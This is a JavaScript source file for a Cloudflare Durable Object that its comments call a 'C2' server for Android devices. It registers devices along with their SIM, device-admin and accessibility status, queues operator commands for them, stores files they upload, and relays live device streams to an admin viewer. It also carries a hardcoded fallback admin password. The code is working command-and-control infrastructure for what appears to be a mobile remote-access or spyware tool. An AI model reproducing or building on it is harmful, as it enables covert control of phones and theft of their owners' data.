// Single Durable Object instance ("global") holds all C2 state, the command
// queue and the WebSocket relay. Mirrors server/server.py exactly.

const enc = new TextEncoder();

function hex(buf) {
  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
}

async function hmacHex(secret, msg) {
  const key = await crypto.subtle.importKey(
    "raw", enc.encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"],
  );
  return hex(await crypto.subtle.sign("HMAC", key, enc.encode(msg)));
}

function json(obj, status = 200, headers = {}) {
  return new Response(JSON.stringify(obj), {
    status,
    headers: { "Content-Type": "application/json", ...headers },
  });
}

function cookie(req, name) {
  const c = req.headers.get("Cookie") || "";
  const m = c.match(new RegExp("(?:^|;\\s*)" + name + "=([^;]+)"));
  return m ? decodeURIComponent(m[1]) : "";
}

function clientIp(req) {
  return (
    req.headers.get("CF-Connecting-IP") ||
    (req.headers.get("X-Forwarded-For") || "").split(",")[0].trim() ||
    ""
  );
}

const MIME = {
  png: "image/png", jpg: "image/jpeg", jpeg: "image/jpeg", gif: "image/gif",
  webp: "image/webp", mp4: "video/mp4", webm: "video/webm", mp3: "audio/mpeg",
  wav: "audio/wav", m4a: "audio/mp4", aac: "audio/aac", pdf: "application/pdf",
  txt: "text/plain", json: "application/json", zip: "application/zip",
};

function guessMime(name) {
  const ext = (name || "").split(".").pop().toLowerCase();
  return MIME[ext] || "application/octet-stream";
}

export class C2 {
  constructor(state, env) {
    this.state = state;
    this.env = env;
    this.storage = state.storage;

    this.devices = new Map();     // id -> device obj
    this.commands = new Map();    // id(number) -> cmd obj
    this.filesMeta = new Map();   // id(number) -> {device_id,name,size,created}
    this.admins = new Set();      // admin tokens
    this.rooms = new Map();       // "dev/kind" -> Set(viewer ws)
    this.devSockets = new Map();  // "dev/kind" -> device ws
    this.seq = 0;
    this.lastPersist = new Map(); // id -> ts

    this.ready = state.blockConcurrencyWhile(async () => {
      for (const [k, v] of await this.storage.list({ prefix: "dev:" })) this.devices.set(k.slice(4), v);
      for (const [k, v] of await this.storage.list({ prefix: "cmd:" })) this.commands.set(Number(k.slice(4)), v);
      for (const [k, v] of await this.storage.list({ prefix: "file:" })) this.filesMeta.set(Number(k.slice(5)), v);
      for (const [k] of await this.storage.list({ prefix: "admin:" })) this.admins.add(k.slice(6));
      this.seq = (await this.storage.get("seq")) || 0;
    });
  }

  async deviceAuth(req, id) {
    const got = req.headers.get("X-Sim1-Auth") || "";
    if (!id || !got) return false;
    return got === (await hmacHex(this.env.C2_DEVICE_SECRET, id));
  }

  adminToken(req) {
    const t = req.headers.get("X-Admin-Token") || cookie(req, "sim1_admin");
    return t && this.admins.has(t) ? t : null;
  }

  async nextId() {
    this.seq += 1;
    await this.storage.put("seq", this.seq);
    return this.seq;
  }

  async persDevice(id) {
    const now = Date.now();
    if ((this.lastPersist.get(id) || 0) > now - 20000) return;
    this.lastPersist.set(id, now);
    const d = this.devices.get(id);
    if (d) await this.storage.put("dev:" + id, d);
  }

  async fetch(request) {
    await this.ready;
    const url = new URL(request.url);
    const p = url.pathname;
    const method = request.method;
    const seg = p.split("/").filter(Boolean);

    // -------- device side --------
    if (p === "/api/register" && method === "POST") {
      const body = await request.json();
      const id = body.id || hex(crypto.getRandomValues(new Uint8Array(8)));
      if (!(await this.deviceAuth(request, id))) return json({ ok: false, err: "auth" }, 401);
      const now = Date.now() / 1000;
      const prev = this.devices.get(id) || { first_seen: now };
      this.devices.set(id, {
        id, name: body.name || null, model: body.model || null, brand: body.brand || null,
        android_ver: body.android || null, sdk: body.sdk || 0, sim: body.sim || null,
        battery: body.battery || 0, network: body.network || "", ip: clientIp(request),
        last_seen: now, first_seen: prev.first_seen || now,
        admin: body.admin ? 1 : 0, a11y: body.a11y ? 1 : 0, stream: body.stream ? 1 : 0,
        note: prev.note || "",
      });
      await this.storage.put("dev:" + id, this.devices.get(id));
      return json({ ok: true, id });
    }

    if (p === "/api/heartbeat" && method === "POST") {
      const body = await request.json();
      const id = body.id || "";
      if (!(await this.deviceAuth(request, id))) return json({ ok: false }, 401);
      const d = this.devices.get(id);
      if (d) {
        d.battery = body.battery || 0; d.network = body.network || "";
        d.ip = clientIp(request); d.last_seen = Date.now() / 1000;
        d.admin = body.admin ? 1 : 0; d.a11y = body.a11y ? 1 : 0; d.stream = body.stream ? 1 : 0;
        await this.persDevice(id);
      }
      return json({ ok: true });
    }

    if (p === "/api/poll" && method === "POST") {
      const body = await request.json();
      const id = body.id || "";
      if (!(await this.deviceAuth(request, id))) return json({ ok: false }, 401);
      const cmds = [];
      for (const c of this.commands.values()) {
        if (c.device_id === id && c.status === "queued") {
          c.status = "sent";
          await this.storage.put("cmd:" + c.id, c);
          cmds.push({ cid: c.id, type: c.type, args: JSON.parse(c.args || "{}") });
          if (cmds.length >= 5) break;
        }
      }
      return json({ ok: true, cmds });
    }

    if (p === "/api/result" && method === "POST") {
      const body = await request.json();
      const id = body.id || "";
      if (!(await this.deviceAuth(request, id))) return json({ ok: false }, 401);
      const c = this.commands.get(Number(body.cid));
      if (c && c.device_id === id) {
        c.status = "done";
        c.result = JSON.stringify(body.result);
        c.done = Date.now() / 1000;
        await this.storage.put("cmd:" + c.id, c);
      }
      return json({ ok: true });
    }

    if (seg[0] === "api" && seg[1] === "upload" && method === "POST") {
      const deviceId = seg[2] || "";
      if (!(await this.deviceAuth(request, deviceId))) return json({ ok: false, err: "auth" }, 401);
      const bytes = await request.arrayBuffer();
      const raw = url.searchParams.get("name") || "file.bin";
      const name = raw.split(/[\\/]/).pop();
      const fid = await this.nextId();
      const meta = { device_id: deviceId, name, size: bytes.byteLength, created: Date.now() / 1000 };
      await this.env.FILES.put("f:" + fid, bytes);
      await this.storage.put("file:" + fid, meta);
      this.filesMeta.set(fid, meta);
      return json({ ok: true, id: fid });
    }

    // -------- admin side --------
    if (p === "/api/login" && method === "POST") {
      const data = await request.formData();
      const user = data.get("user") || "";
      const pass = data.get("pass") || "";
      const want = this.env.C2_PASS || "Prishil@123";
      if (user === (this.env.C2_ADMIN || "admin") && pass === want) {
        const tok = crypto.randomUUID().replace(/-/g, "") + hex(crypto.getRandomValues(new Uint8Array(16)));
        this.admins.add(tok);
        await this.storage.put("admin:" + tok, true);
        return json({ ok: true, token: tok }, 200, {
          "Set-Cookie": `sim1_admin=${tok}; HttpOnly; Path=/; Secure; SameSite=Strict`,
        });
      }
      return json({ ok: false }, 401);
    }

    if (p === "/api/logout" && method === "POST") {
      const t = this.adminToken(request);
      if (t) { this.admins.delete(t); await this.storage.delete("admin:" + t); }
      return json({ ok: true }, 200, { "Set-Cookie": "sim1_admin=; Path=/; Max-Age=0" });
    }

    if (p === "/api/devices" && method === "GET") {
      if (!this.adminToken(request)) return json({ ok: false, err: "auth" }, 401);
      const now = Date.now() / 1000;
      const out = [...this.devices.values()]
        .sort((a, b) => (b.last_seen || 0) - (a.last_seen || 0))
        .map((d) => ({ ...d, online: now - (d.last_seen || 0) < 45 }));
      return json({ ok: true, devices: out });
    }

    if (p === "/api/cmd" && method === "POST") {
      if (!this.adminToken(request)) return json({ ok: false, err: "auth" }, 401);
      const body = await request.json();
      if (!body.device_id || !body.type) return json({ ok: false, err: "bad" }, 400);
      const id = await this.nextId();
      const cmd = {
        id, device_id: body.device_id, type: body.type,
        args: JSON.stringify(body.args || {}), status: "queued",
        result: null, created: Date.now() / 1000, done: null,
      };
      this.commands.set(id, cmd);
      await this.storage.put("cmd:" + id, cmd);
      return json({ ok: true, cid: id });
    }

    if (p === "/api/cmdlog" && method === "GET") {
      if (!this.adminToken(request)) return json({ ok: false, err: "auth" }, 401);
      const deviceId = url.searchParams.get("device_id") || "";
      const cmds = [...this.commands.values()]
        .filter((c) => c.device_id === deviceId)
        .sort((a, b) => b.id - a.id)
        .slice(0, 100);
      return json({ ok: true, cmds });
    }

    if (p === "/api/files" && method === "GET") {
      if (!this.adminToken(request)) return json({ ok: false, err: "auth" }, 401);
      const deviceId = url.searchParams.get("device_id") || "";
      const files = [...this.filesMeta.entries()]
        .filter(([, m]) => m.device_id === deviceId)
        .sort((a, b) => b[0] - a[0])
        .map(([id, m]) => ({ id, name: m.name, size: m.size, created: m.created }));
      return json({ ok: true, files });
    }

    if (seg[0] === "api" && seg[1] === "file" && method === "GET") {
      if (!this.adminToken(request)) return json({ ok: false, err: "auth" }, 401);
      const fid = seg[2];
      const meta = this.filesMeta.get(Number(fid));
      if (!meta) return new Response("not found", { status: 404 });
      const data = await this.env.FILES.get("f:" + fid, "arrayBuffer");
      if (!data) return new Response("not found", { status: 404 });
      const headers = { "Content-Type": guessMime(meta.name) };
      if (url.searchParams.get("inline") == null) {
        headers["Content-Disposition"] = `attachment; filename="${meta.name}"`;
      }
      return new Response(data, { status: 200, headers });
    }

    if (seg[0] === "api" && seg[1] === "device" && method === "DELETE") {
      if (!this.adminToken(request)) return json({ ok: false, err: "auth" }, 401);
      const deviceId = seg[2];
      this.devices.delete(deviceId);
      await this.storage.delete("dev:" + deviceId);
      for (const c of [...this.commands.values()]) {
        if (c.device_id === deviceId) { this.commands.delete(c.id); await this.storage.delete("cmd:" + c.id); }
      }
      for (const [fid, m] of [...this.filesMeta.entries()]) {
        if (m.device_id === deviceId) {
          this.filesMeta.delete(fid);
          await this.storage.delete("file:" + fid);
          await this.env.FILES.delete("f:" + fid);
        }
      }
      return json({ ok: true });
    }

    if (p === "/api/note" && method === "POST") {
      if (!this.adminToken(request)) return json({ ok: false, err: "auth" }, 401);
      const body = await request.json();
      const d = this.devices.get(body.device_id);
      if (d) { d.note = body.note || ""; await this.storage.put("dev:" + d.id, d); }
      return json({ ok: true });
    }

    // -------- stream relay --------
    if (seg[0] === "ws" && seg[1] === "stream" && seg.length >= 4) {
      return this.stream(request, seg[2], seg[3]);
    }

    return json({ ok: false, err: "notfound" }, 404);
  }

  stream(request, deviceId, kind) {
    const role = new URL(request.url).searchParams.get("role") || "";
    const key = deviceId + "/" + kind;
    const pair = new WebSocketPair();
    const [client, server] = Object.values(pair);

    if (role === "device") {
      return this.deviceStream(request, server, client, deviceId, kind, key);
    }
    if (!this.adminToken(request)) return new Response("unauthorized", { status: 401 });
    return this.viewerStream(server, client, key);
  }

  async deviceStream(request, server, client, deviceId, kind, key) {
    if (!(await this.deviceAuth(request, deviceId))) return new Response("unauthorized", { status: 401 });
    server.accept();
    this.devSockets.set(key, server);
    const room = this.rooms.get(key) || new Set();
    this.rooms.set(key, room);
    server.addEventListener("message", (ev) => {
      const data = ev.data;
      for (const v of [...room]) {
        try { v.send(data); } catch (e) { room.delete(v); }
      }
    });
    const close = () => {
      room.delete(server);
      if (this.devSockets.get(key) === server) this.devSockets.delete(key);
    };
    server.addEventListener("close", close);
    server.addEventListener("error", close);
    return new Response(null, { status: 101, webSocket: client });
  }

  viewerStream(server, client, key) {
    server.accept();
    const room = this.rooms.get(key) || new Set();
    this.rooms.set(key, room);
    room.add(server);
    const close = () => {
      room.delete(server);
      if (room.size === 0) {
        const dev = this.devSockets.get(key);
        if (dev) {
          try { dev.send(JSON.stringify({ ctl: "viewer_gone", kind: key.split("/")[1] })); } catch (e) {}
        }
      }
    };
    server.addEventListener("close", close);
    server.addEventListener("error", close);
    return new Response(null, { status: 101, webSocket: client });
  }
}
